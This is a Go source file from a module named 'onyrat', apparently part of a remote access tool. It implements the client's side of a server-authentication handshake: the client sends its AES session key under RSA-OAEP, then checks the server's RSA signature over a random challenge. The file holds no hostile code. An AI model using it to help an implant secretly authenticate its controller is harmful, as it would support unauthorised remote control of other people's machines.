//go:build client
// +build client

package auth

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/xtaci/smux"
)

// Client-side server authorization
func ServerAuthorization(c *network.KCPClient, manager *network.StreamManager, publicKey string) error {
	block, _ := pem.Decode([]byte(publicKey))
	if block == nil {
		return fmt.Errorf("failed to parse public key")
	}

	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("failed to parse public key: %w", err)
	}

	pub, ok := pubInterface.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("public key is not RSA")
	}

	if err := authorizeServer(c, pub); err != nil {
		c.Close()
		return fmt.Errorf("failed to authorize server: %w", err)
	}
	logger.Log.Info("Server is successfully authorized.")

	c.Authorized = true

	return nil
}

// This function takes the client's randomly generated AES key, encrypts it and sends it to the server, then it sends
// a challenge to the server and expects it to sign it, if the signature is incompatable with the configured public key
// that means that the RSA key pair does not match between the client and the server therefore an error is returned.
func authorizeServer(c *network.KCPClient, key *rsa.PublicKey) error {
	stream, err := c.Manager.OpenStream(authStream, 30*time.Second)
	if err != nil {
		return fmt.Errorf("failed to open authorization stream: %w", err)
	}
	defer stream.Close()

	challenge, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, key, c.AESKey, nil)
	if err != nil {
		return fmt.Errorf("failed to encrypt AES key: %w", err)
	}

	if err := c.SendSerialized(stream, challenge, 15*time.Second); err != nil {
		return fmt.Errorf("failed to send AES key: %w", err)
	}

	if err := handleServerSignature(c, stream, key); err != nil {
		return fmt.Errorf("failed to handle server's signature: %w", err)
	}

	return nil
}

func handleServerSignature(c *network.KCPClient, stream *smux.Stream, key *rsa.PublicKey) error {
	challenge := make([]byte, 32)
	rand.Read(challenge) // Docs say that the function never returns an error, so no need to check

	if err := c.SendSerialized(stream, challenge, 15*time.Second); err != nil {
		return fmt.Errorf("failed to send challenge: %w", err)
	}

	buf := bufPool.Get().([]byte)
	defer bufPool.Put(buf)

	n, err := c.ReceiveSerialized(stream, buf, 15*time.Second)
	if err != nil {
		return fmt.Errorf("failed to receive signature: %w", err)
	}

	signature := buf[:n]

	hash := sha256.Sum256(challenge)
	if err := rsa.VerifyPKCS1v15(key, crypto.SHA256, hash[:], signature); err != nil {
		return fmt.Errorf("server identity check failed")
	}

	return nil
}
